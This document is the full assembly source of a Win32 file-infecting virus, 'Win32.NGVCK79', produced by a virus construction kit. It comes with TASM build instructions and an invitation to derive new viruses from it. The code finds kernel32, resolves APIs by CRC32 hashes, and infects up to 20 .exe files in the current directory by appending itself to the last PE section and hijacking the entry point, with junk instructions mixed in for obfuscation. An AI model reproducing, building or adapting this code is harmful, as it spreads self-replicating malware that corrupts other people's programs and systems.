              
;
;
; Win32.NGVCK79 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK79
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 42
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop ecx

 push ecx
 pop dword ptr [ebp+retBase]


                                        ; get Kernel by using hardcoded values
 mov ebx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov ebx, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear esi
 mov esi, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[esi]
 mov ecx, offset GetKernel32Exception
 add ecx, ebp

 push ecx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 mov ecx, dword ptr [ebp+K32Trys]
 or ecx, ecx
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE

GK2:
 inc ebx
 sub ebx, 65537d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 dec ebx
 add ebx, 61d
 mov eax, [ebx]
 sub ebx, 60d
 add dword ptr [ebp+Trash1], 1839986    ; Trash
 xchg eax, ebx
 add ebx, eax
 xchg eax, ebx
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add eax, 22
 add eax, 22d
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [eax]
 and dx, 0F000h
 cmp dx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 sub eax, 22d


KernelFound:
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], eax
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], ebx

                                        ; clear ebx
 mov ebx, 30527d
 sub ebx, 30527d

 pop dword ptr fs:[ebx]
 pop edx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear edx
 mov edx, -33508d
 add edx, 33508d

 mov eax, dword ptr fs:[edx]
 not ebx                                ; Trash
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear ebx
 and ebx, 0

 pop dword ptr fs:[ebx]
 pop ecx
 popad
 stc
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 and dword ptr [ebp+Trash1], 352811     ; Trash
 xchg esi, ecx

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; clear ecx
 mov ecx, 59248d
 sub ecx, 59248d
 xor ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; mov ecx, ebx
                                        ; clear ecx
 and ecx, 0
 add ecx, ebx
                                        ; mov esi, ecx
 push ecx
 pop esi
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 xor edx, edx                           ; Trash
 push dword ptr [ebp+APICRC32]
 pop ebx
 sub ebx, dword ptr [eax]
 test ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ecx
 dec edx                                ; Trash
                                        ; mov esi, -1
 mov esi, ( -1d xor 17d )
 xor esi, 17d
 and esi, dword ptr [ebp+TempApisearch2]
 mov eax, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov ecx, edx
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [ecx]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ebx, word ptr [eax]
 xor ebx, 'ZM'
 jz Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [eax+3Ch]
                                        ; add edx, 1
 add edx, 1d
 sub edx, 1
 jz Notagoodfile
 mov edx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [edx]
 sub ecx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edi, ebx

 push edi
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg esi, ebx

                                        ; mov eax, 276
 mov eax, ( 276d + 4d )
 sub eax, 4d

ClearOldData2:
 rcl edx, 24d                           ; Trash
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, edx

 push edx
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 xor esi, esi
 xor esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi

 push dword ptr [ebp+OldEIP]
 pop edi

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 jmp ebx



;                  [ ///// * Data * \\\\\ ]

Data:
 OTableVA    dd 0h
 InfCounter  dd 0h
 APICRC32    dd 0h
 AlignReg1   dd 0h

 APINames:
 dd 0AA700106h           ; FindNextFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 068624A9Dh           ; CloseHandle
 dd 0C200BE21h           ; FindClose
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 08C892DDFh           ; CreateFileA
 dd 094524B42h           ; UnmapViewOfFile

 FileHandle  dd 0h
 FindHandle  dd 0h
 TempApisearch2 dd 0h
 TempApisearch3 dd 0h
 MapAddress  dd 0h
 KernelMZ    dd 0h
 TempAPI     dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 NewEIP      dd 0h
 filemask    db '*.Exe',0
 MapHandle   dd 0h
 OldBase     dd 400000h
 OldEIP      dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Win32.NGVCK79 of SnakeByte',0
 KernelPE    dd 0h
 Trash1      dd 0h
 NewSize     dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 K32Trys     dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear ecx
 mov ecx, 58161d
 sub ecx, 58161d
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [ecx+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 dec edx
 add edx, 29d
                                        ; get ATableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; add edx, 4
 add edx, 4d
                                        ; get NTableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 mov esi, offset APIOffsets
 add dword ptr [ebp+Trash1], 435155     ; Trash
 add esi, ebp

 mov eax, ebp
 add eax, offset APINames


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
 push dword ptr [ebp+TempAPI]
 pop edi
 mov dword ptr [esi], 0
 add dword ptr [esi], edi
                                        ; add esi, 4
 add esi, 4d
 loop GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg edi, esi

 push esi
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, -56769d
 add edx, 56769d
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ebx, esi
 push esi
 pop ebx
LenCRC:
                                        ; add ebx, 1
 sub ebx, -1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, esi
                                        ; mov edi, ebx
 push ebx
 pop edi
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear edx
 sub edx, edx
 add edx, -1
                                        ; mov eax, edx
 mov eax, edx
NextByteCRC:
                                        ; clear ebx
 sub ebx, ebx
                                        ; clear ecx
 mov ecx, 37043d
 sub ecx, 37043d
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 xor bl, dl
 mov dl, dh
 mov dh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor edx, ebx
 xor eax, ecx
 dec edi
jnz NextByteCRC
 not eax
 not edx
 mov ebx, eax
 rol ebx, 16d
 mov bx, dx
 push ebx
 pop dword ptr [ebp+APICRC32]
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edi
                                        ; retrieve PE - Header
 mov esi, [edi+3Ch]
 add esi, edi
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ecx, [esi]
                                        ; mov edx, 60
 mov edx, ( 60d + 20d )
 sub edx, 20d
 sub esi, edx
                                        ; clear edx
 and edx, 0
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 push edx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 dec edx
 imul edx, edx, 28h
 add ebx, edx
                                        ; add ebx, 120
 add ebx, 120d
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [esi+74h]
 clc
 rcl eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], ecx
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], edx
 mov edx, [ebx+10h]
                                        ; mov eax, edx
                                        ; clear eax
 mov eax, 0
 add eax, edx
 add ebx, 14h
 add edx, [ebx]
 sub ebx, 14h
 push edx
 push eax
 pop ecx
 add ecx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], -1
 and dword ptr [ebp+NewEIP], ecx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ecx
                                        ; clear ecx
 sub ecx, ecx

 add ecx, [ebx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebx+10h], ecx
 dec dword ptr [ebp+Trash1]             ; Trash
 pop ecx
 add ecx, VirusSize
 mov dword ptr [ebx+08h], ecx
 mov ecx, dword ptr [ebx+0Ch]
 add ecx, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop edx
 sub edx, 1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], edx
 clc
ret
 and eax, ebx                           ; Trash

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 sub ebx, ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 sub ebx, -1d
 push ebx
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg edx, edi

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 mov ecx, -61252d
 add ecx, 61252d
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
                                        ; add eax, 1
 inc eax
 dec eax
 jz CloseFile
                                        ; clear edx
 mov edx, -10140d
 add edx, 10140d
 push ebx
 push edx
 push edx
 and eax, 91281783d                     ; Trash
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ebx
 push 0
 pop ebx
 push ebx
 call ExitProcess



end FakeCode

